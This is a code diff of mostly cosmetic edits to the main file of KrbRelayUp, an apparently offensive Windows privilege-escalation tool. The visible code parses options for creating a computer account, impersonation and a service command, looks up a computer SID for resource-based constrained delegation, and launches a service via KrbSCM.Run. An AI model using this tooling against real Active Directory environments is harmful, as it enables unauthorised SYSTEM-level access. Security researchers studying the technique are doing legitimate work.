@@ -73,8 +73,6 @@ namespace KrbRelayUp
                 Environment.Exit(0);
             }
 
-            
-
             // parse args
             int iDomain = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(d|Domain)$").Match(s).Success);
             int iCreateNewComputerAccount = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(c|CreateNewComputerAccount)$").Match(s).Success);
@@ -85,7 +83,6 @@ namespace KrbRelayUp
             int iImpersonate = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(i|Impersonate)$").Match(s).Success);
             int iServiceName = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(s|ServiceName)$").Match(s).Success);
             int iServiceCommand = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(sc|ServiceCommand)$").Match(s).Success);
-
 
             if (iServiceName != -1)
                 serviceName = args[iServiceName + 1];
@@ -166,7 +163,6 @@ namespace KrbRelayUp
                         Console.WriteLine($"[-] {e.Message}");
                         Environment.Exit(0);
                     }
-
                 }
 
                 // Get Computer SID for RBCD
@@ -211,17 +207,15 @@ namespace KrbRelayUp
                 KrbSCM.Run(targetSPN, serviceName, serviceCommand);
                 Environment.Exit(0);
             }
-
-
         }
 
         public static string GetObjectSidForComputerName(LdapConnection ldapConnection, string computerName, string searchBase)
         {
             string searchFilter = $"(sAMAccountName={computerName}$)";
-            SearchRequest searchRequest = new SearchRequest(searchBase, searchFilter, System.DirectoryServices.Protocols.SearchScope.Subtree, new string[] { "DistinguishedName", "objectSid" });
+            SearchRequest searchRequest = new SearchRequest(searchBase, searchFilter, SearchScope.Subtree, "DistinguishedName", "objectSid");
             try
             {
-                var response = (SearchResponse)ldapConnection.SendRequest(searchRequest);
+                SearchResponse response = (SearchResponse)ldapConnection.SendRequest(searchRequest);
                 return (new SecurityIdentifier((byte[])response.Entries[0].Attributes["objectSid"][0], 0)).ToString();
             }
             catch (Exception e)
